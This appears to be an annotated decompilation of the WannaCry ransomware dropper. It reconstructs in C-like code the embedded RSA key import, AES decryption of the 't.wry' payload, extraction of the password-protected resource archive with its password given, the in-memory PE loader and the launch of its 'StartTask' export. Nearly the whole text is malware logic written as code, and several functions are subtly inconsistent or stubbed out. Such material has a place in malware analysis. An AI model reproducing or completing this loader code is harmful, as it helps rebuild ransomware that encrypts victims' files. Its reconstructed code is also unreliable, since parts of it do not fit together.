// WannaCry Dropper (WannaCry.exe) - Batch 1: Core Functions
// SHA256: be22645c61949ad6a077373a7d6cd85e3fae44315632f161adc4c99d5a8e6844
// IDA Database: 442b9b2d216f

// ============================================================================
// sub_401000 - Crypto context constructor
// ============================================================================
void __cdecl sub_401000(void *this)
{
  // Initialize critical section at this+16
  InitializeCriticalSection((LPCRITICAL_SECTION)((char *)this + 16));
  // Initialize CryptoAPI context (sub_40146B)
  sub_40146B(this);
  // Import embedded RSA private key (NULL = use embedded)
  sub_4014A0(this, NULL);
  // Import second key (possibly public key or another private)
  sub_4014A0((char *)this + 2, NULL);
  // Allocate two 1MB GlobalAlloc buffers
  *(void **)((char *)this + 306) = GlobalAlloc(0, 0x100000);
  *(void **)((char *)this + 307) = GlobalAlloc(0, 0x100000);
}

// ============================================================================
// sub_40107D - Crypto context destructor
// ============================================================================
void __cdecl sub_40107D(void *this)
{
  // Free 1MB buffers
  if (*(void **)((char *)this + 306)) GlobalFree(*(void **)((char *)this + 306));
  if (*(void **)((char *)this + 307)) GlobalFree(*(void **)((char *)this + 307));
  // Release CryptoAPI context
  sub_4014F8(this);
  // Delete critical section
  DeleteCriticalSection((LPCRITICAL_SECTION)((char *)this + 16));
}

// ============================================================================
// sub_40113A - Initialize crypto + allocate buffers
// ============================================================================
int __cdecl sub_40113A(void *this, int a2, int a3)
{
  sub_4014A0(this, NULL);  // Import embedded key
  // Allocate two 1MB GlobalAlloc buffers at this+306, this+307
  *(void **)((char *)this + 306) = GlobalAlloc(0, 0x100000);
  *(void **)((char *)this + 307) = GlobalAlloc(0, 0x100000);
  return 1;
}

// ============================================================================
// sub_4011A9 - Decrypt .wry file (t.wry)
// Format: "WANNACRY"(8) + DWORD rsa_len(256) + 256B RSA blob + DWORD v8 + QWORD dwBytes + ciphertext
// ============================================================================
int __cdecl sub_4011A9(const char *FileName, int *a2)
{
  HANDLE hFile = CreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) return 0;

  char magic[8];
  DWORD bytesRead;
  ReadFile(hFile, magic, 8, &bytesRead, NULL);
  if (bytesRead != 8 || memcmp(magic, "WANNACRY", 8) != 0) { CloseHandle(hFile); return 0; }

  DWORD rsa_len;
  ReadFile(hFile, &rsa_len, 4, &bytesRead, NULL);
  if (rsa_len != 256) { CloseHandle(hFile); return 0; }

  BYTE rsa_blob[256];
  ReadFile(hFile, rsa_blob, 256, &bytesRead, NULL);

  DWORD v8;
  ReadFile(hFile, &v8, 4, &bytesRead, NULL);  // =4 in sample

  ULONGLONG dwBytes;
  ReadFile(hFile, &dwBytes, 8, &bytesRead, NULL);
  if (dwBytes > 100000000) { CloseHandle(hFile); return 0; }

  // RSA decrypt via sub_401620 (CryptDecrypt with Final=TRUE under critical section)
  BYTE aes_key[16];
  sub_401620(this, rsa_blob, 256, aes_key, 16);

  // AES key expansion: sub_40224E(key, IV, keylen, 16)
  sub_40224E(aes_key, global_IV, 16, 16);

  // Allocate buffer for ciphertext
  void *buf = GlobalAlloc(0, dwBytes);
  ReadFile(hFile, buf, dwBytes, &bytesRead, NULL);
  CloseHandle(hFile);

  // CBC decrypt via sub_40324F(..., 1)
  sub_40324F(buf, dwBytes, 1);

  *a2 = (int)buf;
  return 1;
}

// ============================================================================
// sub_4014A0 - Import RSA key (embedded or from file)
// ============================================================================
int __cdecl sub_4014A0(void *this, const char *lpFileName)
{
  HCRYPTPROV hProv = 0;
  sub_40146B(&hProv);  // CryptAcquireContext

  if (!lpFileName) {
    // Embedded PRIVATEKEYBLOB at 0x40EB38, size 0x494 (1172 bytes)
    // BLOBHEADER: type=7(PRIVATEKEYBLOB), ver=2, alg=0xA400(CALG_RSA_KEYX)
    // "RSA2", bitlen=2048, e=65537
    CryptImportKey(hProv, (BYTE *)0x40EB38, 0x494, 0, 0, (HCRYPTKEY *)((char *)this + 8));
  } else {
    sub_401538(lpFileName, this);  // Read key file (<=0x19000) and CryptImportKey
  }
  return 1;
}

// ============================================================================
// sub_401620 - RSA decrypt wrapper (CryptDecrypt with Final=TRUE)
// ============================================================================
int __cdecl sub_401620(void *this, BYTE *in, int in_len, BYTE *out, int out_len)
{
  EnterCriticalSection((LPCRITICAL_SECTION)((char *)this + 16));
  BOOL ok = CryptDecrypt(*(HCRYPTKEY *)((char *)this + 8), 0, TRUE, 0, out, (DWORD *)&out_len);
  LeaveCriticalSection((LPCRITICAL_SECTION)((char *)this + 16));
  return ok;
}

// ============================================================================
// sub_401684 - argv gate
// ============================================================================
int __cdecl sub_401684(int argc, char **argv, DWORD *a3)
{
  if (argc <= 1 || strcmp(argv[1], "/r") == 0) {
    *a3 = 0;
    return 1;
  }
  if (strcmp(argv[1], "/f") == 0 && argc >= 3) {
    WSAStartup(0x202, ...);
    *a3 = inet_addr(argv[2]);
    WSACleanup();
    return 1;
  }
  if (strlen(argv[1]) == 8) {
    sscanf(argv[1], "%08X", a3);
    return 1;
  }
  return 0;  // exit
}

// ============================================================================
// sub_401749 - Extract SMD resource (ID 105) ZIP to disk
// ============================================================================
void __cdecl sub_401749(HMODULE hModule, const char *password)
{
  HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCE(105), "SMD");
  HGLOBAL hGlob = LoadResource(hModule, hRes);
  void *data = LockResource(hGlob);
  DWORD size = SizeofResource(hModule, hRes);

  // unzOpen memory mode (3) with password
  void *uz = sub_406D85(data, size, password);
  sub_406CFF(uz, password);  // Store password in 0x244-byte struct

  // Loop entries, extract unless file exists AND name=="c.wry"
  while (unzGoToNextFile(uz) == UNZ_OK) {
    char name[256];
    unzGetCurrentFileInfo(uz, ..., name, ...);
    if (file_exists(name) && strcmp(name, "c.wry") == 0) continue;
    unzOpenCurrentFilePassword(uz, password);
    unzReadCurrentFile(uz, ...);
    unzCloseCurrentFile(uz);
  }
  unzClose(uz);
}

// ============================================================================
// sub_401995 -> sub_4019C1 - In-memory ZIP/PE loader
// Callbacks: alloc=0x401946, free=0x40195D, loadlib=0x401970, freelib=0x40198A, beep=_beep
// ============================================================================
int __cdecl sub_401995(void *buf, int len, int *out_pe_base)
{
  // Setup callback struct
  callbacks.alloc = sub_401946;      // VirtualAlloc
  callbacks.free = sub_40195D;       // VirtualFree
  callbacks.loadlib = sub_401970;    // LoadLibraryA
  callbacks.freelib = sub_40198A;    // FreeLibrary
  callbacks.beep = _beep;

  return sub_4019C1(buf, len, &callbacks, out_pe_base);
}

// ============================================================================
// sub_4020FC - Manual GetProcAddress on in-memory PE
// Walks export name table with _stricmp
// ============================================================================
void *__cdecl sub_4020FC(void *pe_base, const char *export_name)
{
  IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)pe_base;
  IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((char *)pe_base + dos->e_lfanew);
  IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)((char *)pe_base + 
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

  DWORD *names = (DWORD *)((char *)pe_base + exp->AddressOfNames);
  WORD *ordinals = (WORD *)((char *)pe_base + exp->AddressOfNameOrdinals);
  DWORD *functions = (DWORD *)((char *)pe_base + exp->AddressOfFunctions);

  for (DWORD i = 0; i < exp->NumberOfNames; i++) {
    const char *name = (const char *)((char *)pe_base + names[i]);
    if (_stricmp(name, export_name) == 0) {
      WORD ord = ordinals[i];
      return (void *)((char *)pe_base + functions[ord]);
    }
  }
  return NULL;
}

// ============================================================================
// AES Implementation
// ============================================================================

// sub_40224E - AES Key Expansion (16/24/32 byte keys, rounds 10/12/14)
// S-box: byte_408994, Te tables: dword_40AB94/40AF94/40B394/40B794
// State layout: this+8=enc_keys, this+488=dec_keys, this+968=keylen, this+972=blocksize, this+1008=IV, this+1040=rounds, this+1044=temp

// sub_402656 - AES Encrypt Round (1 of 4 round functions)
// sub_402994 - AES Encrypt Round (2)
// sub_402CE7 - AES Encrypt Block
// sub_402F6F - AES Decrypt Block
// sub_403200 - XOR block (for CBC/CFB)

// ============================================================================
// sub_40324F - AES Mode Driver
// a5 == 1: CBC Decrypt (D(block) ^ IV, IV = ciphertext)
// a5 == 2: CFB (E(IV) ^ input, IV = output)
// else: ECB Decrypt
// Uses sub_402F6F (decrypt block), sub_402CE7 (encrypt block), sub_403200 (XOR)
// ============================================================================

// ============================================================================
// Minizip wrappers (sub_406C53..0x406E2E)
// ============================================================================
// sub_406D85(data, size, password) -> sub_406C7C(data, size, 3, password) = unzOpen memory mode
// sub_406CFF(struct, password) - stores password in 0x244-byte struct
// sub_406D9C - unzGetCurrentFileInfo
// sub_406E15 - extract entry
// sub_406E2E - unzClose

// ============================================================================
// WinMain @0x40183B - Full Flow
// ============================================================================
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
  SetErrorMode(2);

  DWORD v11 = 0;
  if (!sub_401684(__argc, __argv, &v11)) return 0;

  char exePath[MAX_PATH];
  GetModuleFileNameA(NULL, exePath, MAX_PATH);
  // Strip exe name, keep directory
  PathRemoveFileSpecA(exePath);
  SetCurrentDirectoryA(exePath);

  // Extract SMD resource ZIP (skip if c.wry exists)
  sub_401749(NULL, "wcry@2016");

  // Crypto context
  void *crypto_ctx = malloc(...);
  sub_401000(crypto_ctx);

  // Decrypt t.wry -> in-memory PE
  int pe_base = 0;
  sub_40113A(crypto_ctx, 0, 0);
  sub_4011A9("t.wry", &pe_base);
  sub_401995(pe_base, ..., &pe_base);

  // Resolve StartTask export and call it
  void *StartTask = sub_4020FC(pe_base, "StartTask");
  if (StartTask) ((void(*)(int, DWORD))StartTask)(0, v11);

  sub_40107D(crypto_ctx);
  return 0;
}